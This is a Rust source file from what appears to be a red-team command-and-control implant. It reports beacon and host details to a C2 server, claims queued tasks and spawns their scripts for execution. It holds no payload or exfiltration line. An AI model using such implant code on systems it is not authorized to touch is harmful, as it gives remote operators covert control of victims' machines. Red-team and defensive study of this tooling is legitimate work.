use std::collections::HashMap;

use crate::exec::{handle_exec_timeout_and_response, AsyncTask};
use crate::init::AgentProperties;
use crate::Config;
use anyhow::{Context, Result};
use c2::pb::c2_client::C2Client;
use c2::pb::{Agent, Beacon, ClaimTasksRequest, Host, Task};
use chrono::{NaiveTime, Utc};
use std::sync::mpsc::channel;
use tokio::task;
use tonic::transport::Channel;

pub async fn get_new_tasks(
    agent_properties: AgentProperties,
    imix_config: Config,
    mut tavern_client: C2Client<Channel>,
) -> Result<Vec<Task>> {
    let req = tonic::Request::new(ClaimTasksRequest {
        beacon: Some(Beacon {
            identifier: agent_properties.beacon_id.clone(),
            principal: agent_properties.principal.clone(),
            host: Some(Host {
                identifier: agent_properties.host_id.clone(),
                name: agent_properties.hostname.clone(),
                platform: agent_properties.host_platform.try_into()?,
                primary_ip: agent_properties
                    .primary_ip
                    .clone()
                    .context("primary ip not found")?,
            }),
            agent: Some(Agent {
                identifier: agent_properties.agent_id.clone(),
            }),
            interval: imix_config.callback_config.interval,
        }),
    });
    let new_tasks = match tavern_client.claim_tasks(req).await {
        Ok(resp) => resp.get_ref().tasks.clone(),
        Err(error) => {
            #[cfg(debug_assertions)]
            eprintln!("main_loop: error claiming task\n{:?}", error);
            let empty_vec = vec![];
            empty_vec
        }
    };
    Ok(new_tasks)
}

pub async fn start_new_tasks(
    new_tasks: Vec<Task>,
    all_exec_futures: &mut HashMap<i32, AsyncTask>,
    debug_start_time: NaiveTime,
) -> Result<()> {
    for task in new_tasks {
        #[cfg(debug_assertions)]
        eprintln!("Parameters:\n{:?}", task.clone().parameters);
        #[cfg(debug_assertions)]
        eprintln!("Launching:\n{:?}", task.clone().eldritch);

        let (sender, receiver) = channel::<String>();
        let exec_with_timeout = handle_exec_timeout_and_response(task.clone(), sender.clone());

        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: Queueing task {}",
            (Utc::now().time() - debug_start_time).num_milliseconds(),
            task.clone().id
        );

        match all_exec_futures.insert(
            task.clone().id,
            AsyncTask {
                future_join_handle: task::spawn(exec_with_timeout),
                start_time: Utc::now(),
                grpc_task: task.clone(),
                print_reciever: receiver,
            },
        ) {
            Some(_old_task) => {
                #[cfg(debug_assertions)]
                eprintln!("main_loop: error adding new task. Non-unique taskID\n");
            }
            None => {
                #[cfg(debug_assertions)]
                eprintln!("main_loop: Task queued successfully\n");
            } // Task queued successfully
        }

        #[cfg(debug_assertions)]
        eprintln!(
            "[{}]: Queued task {}",
            (Utc::now().time() - debug_start_time).num_milliseconds(),
            task.clone().id
        );
    }
    Ok(())
}
